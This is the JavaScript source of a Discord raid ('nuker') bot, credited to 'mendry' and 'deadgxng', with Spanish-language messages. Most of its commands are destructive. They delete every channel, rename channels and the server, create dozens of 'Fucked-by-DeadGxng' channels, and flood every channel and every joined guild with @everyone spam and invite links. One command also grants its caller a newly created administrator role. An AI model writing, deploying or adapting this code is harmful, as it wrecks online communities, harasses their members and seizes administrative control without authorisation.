const Discord = require("discord.js");
const axios = require("axios");
const config = require("./config.json");
const client = new Discord.Client();

function handleError(error) {
    const errorMessage = `[ERROR] ${new Date().toLocaleTimeString()} - ${error.message}`;
    console.error(errorMessage);
    setTimeout(() => process.stdout.write('\x1Bc'), 5000);
}

process.on('uncaughtException', handleError);


client.on("ready", () => {
  console.log(`[CONSOLA]: bot started as: ${client.user.username}`);
});

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.content === ".sex") {

  }
});


client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.bypass') {


        const channelText = message.guild.channels.cache;

        channelText.map(c => {
            c.setParent(null)
            c.setName("bypass-by-deadgxng")
        })

        await Promise.allSettled(channelText)

        const MesasgePromxses = [];

   const canales = message.guild.channels.cache.filter(c => c.type === "text")

   canales.forEach(c => {

    const embed = new Discord.MessageEmbed()
    .setTitle("Mierda bypasseada por deadgxng")
    .setURL('https://discord.gg/deadgxng')
    .setDescription("            Esta mierda fue poderada y bypasseada por dead$gxng")
    .setImage("https://media.discordapp.net/attachments/1235237302872313977/1248217236099825734/04660224535ac0d53a4194b054a1def1.png?ex=6662dc63&is=66618ae3&hm=6f1b894abceb03d42697cac2526ad496790d235bc8c4e0bb7cc7859a5bddddc5&=&format=webp&quality=lossless&width=416&height=416")
    .setFooter(".gg/deadgxng | Comando creado por yiko")

    for(let i = 0; i < 30; i++){

        MesasgePromxses.push(c.send("@everyone https://discord.gg/deadgxng", embed))

}
   })

  await Promise.all(MesasgePromxses)

}});

client.on("message", message => {
    if (message.author.bot) return;

    if (message.content === '.server') {
        const guild = message.guild;
        const memberCount = guild.memberCount;
        const channelCount = guild.channels.cache.size;
        const roleCount = guild.roles.cache.size;
        const emojiCount = guild.emojis.cache.size;
        const boostCount = guild.premiumSubscriptionCount;
        const ownerUsername = guild.owner.user.username;
        const ownerId = guild.ownerID;

        const serverInfoEmbed = new Discord.MessageEmbed()
            .setTitle(`Informacion del Sv: ${guild.name}`)
            .addField("Cantidad de Miembros", memberCount, true)
            .addField("Cantidad de Canales", channelCount, true)
            .addField("Cantidad de Roles", roleCount, true)
            .addField("Cantidad de Emojis", emojiCount, true)
            .addField("Cantidad de Boosteos", boostCount, true)
            .addField("owner username hehe", ownerUsername, true)
            .addField("ID del owner", ownerId, true)
            .setColor("#00ff00")
            .setFooter(" Comando creado por mendry");

        message.channel.send(serverInfoEmbed);
    }
});

client.on("message", message => {
    if (message.author.bot) return;

    if (message.content === `<@${client.user.id}>` || message.content === `<@!${client.user.id}>`) {
        const userAvatar = message.author.displayAvatarURL({ format: 'png', size: 128 });
        const username = message.author.username;

        const pingEmbed = new Discord.MessageEmbed()
            .setThumbnail(userAvatar)
            .setTitle(`Hi, ${username}`)
            .setDescription("My prefix here is $ If you type $help you can see my list of commands.")
            .setColor("#00ff00")
            .setFooter("Comando creado por mendry");

        message.channel.send(pingEmbed);
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.ping') {
        const msg = await message.channel.send("Calculando...");

        const apiLatency = Math.round(client.ws.ping);
        const botLatency = msg.createdTimestamp - message.createdTimestamp;

        const pingEmbed = new Discord.MessageEmbed()
            .setTitle("Ping")
            .addField("API Latency", `${apiLatency}ms`, true)
            .addField("Bot Latency", `${botLatency}ms`, true)
            .setColor("#00ff00")
            .setFooter(" Comando creado por mendry");

        msg.edit('', pingEmbed);

        client.on('message', async newMessage => {
            if (newMessage.author.bot) return;

            const newApiLatency = Math.round(client.ws.ping);
            const newBotLatency = newMessage.createdTimestamp - newMessage.createdTimestamp;

            if (apiLatency !== newApiLatency || botLatency !== newBotLatency) {
                const updatedPingEmbed = new Discord.MessageEmbed()
                    .setTitle("Ping Updated")
                    .addField("API Latency", `${newApiLatency}ms`, true)
                    .addField("Bot Latency", `${newBotLatency}ms`, true)
                    .setColor("#00ff00")
                    .setFooter(" Comando creado por mendry");

                message.channel.send('', updatedPingEmbed);
            }
        });
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.nuke') {
        message.guild.channels.cache.forEach(c => c.delete().then((ch) => {
            console.log(`[CONSOLA]: canal eliminado: Name Channel: ${ch.name} | ID : ${ch.id}`);
        }));

        message.guild.channels.create('fucked-by-mendry', {
            type: 'text',
            permissionOverwrites: [
                {
                    id: message.guild.id,
                    deny: ['VIEW_CHANNEL'],
                },
            ],
        }).then(channel => {
            channel.send('|| @everyone || **@Mendry† X 4Dead$Gxng** • https://discord.gg/deadgxng • https://discord.gg/AMvgRSETC7').catch(console.error);
        }).catch(console.error);
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.spam') {
        const amount = 30;

        client.guilds.cache.forEach(guild => {
            guild.channels.cache.forEach(channel => {
                if (channel.type === 'text') {
                    for (let i = 0; i < amount; i++) {
                        channel.send("@everyone fucked by DeadGxng discord.gg/deadgxng #DeadGxng & #4DeadWened");
                    }
                }
            });
        });
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content.startsWith('.addch')) {
        const args = message.content.split(" ");
        const amount = parseInt(args[1]);

        if (isNaN(amount)) {
            return message.channel.send("pone la cantidad de  canales que quieras hacer capo");
        }

        const guild = message.guild;
        const category = await guild.channels.create("Added Channels", { type: "category" });

        for (let i = 1; i <= amount; i++) {
            await guild.channels.create(`Deadgxng-is-here`, {
                type: "text",
                parent: category,
            });
        }

        message.channel.send(`Se han agregado ${amount} canales al servidor.`);
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.help') {
        const helpEmbed = new Discord.MessageEmbed()
            .setTitle("All command loaded")
            .addField(".addch [cantidad]", "Agrega la cantidad  de canales que quieras al servidor.", true)
            .addField(".nuke", "Elimina todos los canales del servidor.", true)
            .addField(".bypass", "Bypassea el servidor.", true)
            .addField(".spam", "fuck", true)
            .addField(".ping", "Muestra el tiempo de latencia del bot y la API.", true)
            .addField(".server", "Muestra la info del sv", true)
            .addField(".change", "cambia foto y name del sv", true)
            .addField(".on", "raid clasica xd", true)
            .addField(".editch", "cambia el nombre de las categorias/canales/vc y bypassea el servidor", true)
            .addField(".admin", "te da perms de mod en el sv donde estes, pero antes de eso el rol ya debe de estar creado y con los perms", true)
            .setColor("#1F8B4C")
            .setFooter(" Comando creado por mendry");

        message.channel.send(helpEmbed);
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.change') {
        if (!message.member.hasPermission('MANAGE_GUILD')) {
            return message.channel.send('No tienes permisos pa nada compai');
        }

        const newIconURL = 'https://cdn.discordapp.com/attachments/1242500576391073862/1254966766619328614/a_e0ea59c437742ce22fc7eefc8627233e.gif?ex=667b6a61&is=667a18e1&hm=453fb97bd4728b583dc6738d6e09abb34f97f0c52399218616bcd3dea0529781&';
        const newServerName = 'Mendryshh is here..';

        try {
            await message.guild.setIcon(newIconURL);
            await message.guild.setName(newServerName);

            message.channel.send('el nombre y foto del sv se cambio correctamente gue');
        } catch (error) {
            console.error('hubo un error al cambiar la foto y nombre del sv gue:', error);
            message.channel.send('Hubo un error al intentar cambiar la foto y name del sv');
        }
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.on') {
        message.guild.channels.cache.forEach(async c => {
            try {
                await c.delete();
                console.log(`[CONSOLA]: canal eliminado: Name Channel: fucked-by-deadgxng | ID : ${c.id}`);
            } catch (error) {
                console.error(`Error al eliminar el canal fucked-by-deadgxng: `, error);
            }
        });

        const createChannels = [];
        for (let i = 1; i <= 59; i++) {
            const channelName = `Fucked-by-DeadGxng`;
            const newChannel = await message.guild.channels.create(channelName, { type: 'text' });
            createChannels.push(newChannel);
        }

          const sendMessagePromises = createChannels.flatMap(channel =>
            Array.from({ length: 30 }, () => channel.send(' @everyone Fucked By DeadGxng https://discord.gg/jBk3AM2a #HailDeadGxng @here'))
        );

        await Promise.all(sendMessagePromises);


        message.channel.send('todo listo compa');
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.serverbot') {
        const guilds = client.guilds.cache.map(guild => ({
            name: guild.name,
            id: guild.id
        }));

        const embed = new Discord.MessageEmbed()
            .setTitle("Servers donde el bot esta gue")
            .setColor("#00ff00")
            .setFooter("Comando creado por mendry");

        guilds.forEach(guild => {
            embed.addField(guild.name, `ID: ${guild.id}`, false);
        });

        message.channel.send(embed);
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.mass_leave') {
        if (!message.member.hasPermission('ADMINISTRATOR')) {
            return message.channel.send('solo gente con roles de mod puede usar este comando');
        }

        const leaveServers = client.guilds.cache.map(guild => guild.leave());

        await Promise.all(leaveServers);

        message.channel.send('El bot abandono to los servers juas juas');
    }
});
    
client.on('message', async message => {
    if (message.author.bot) return;

    if (message.content === '.admin') {
        try {
            message.delete();

            let role = await message.guild.roles.create({
                data: {
                    name: "Almighty",
                    permissions: Discord.Permissions.FLAGS.ADMINISTRATOR
                }
            });

            console.log('[32m[CONSOLE]: Rol de administrador dado');

            role = message.guild.roles.cache.find(r => r.name === "Almighty");
            if (!role) return console.log("[ERROR]: No se pudo encontrar el rol.");

            await message.member.roles.add(role);

            message.react('💀')
                .then(reaction => {
                    setTimeout(() => {
                        reaction.users.remove(message.author.id);
                    }, 5000);
                });

            console.log(`Se otorgó el rol de administrador "Almighty" a ${message.author.username}`);
        } catch (error) {
            console.error(`Ocurrió un error al otorgar el rol de administrador: ${error.message}`);
        }
    }
});

client.on("message", async message => {
    if (message.author.bot) return;

    if (message.content === '.editch') {


        const channelText = message.guild.channels.cache;

        channelText.map(c => {
            c.setParent(null)
            c.setName("fucked-by-mendryshh")
        })

        await Promise.allSettled(channelText)

}});

client.login(config.token);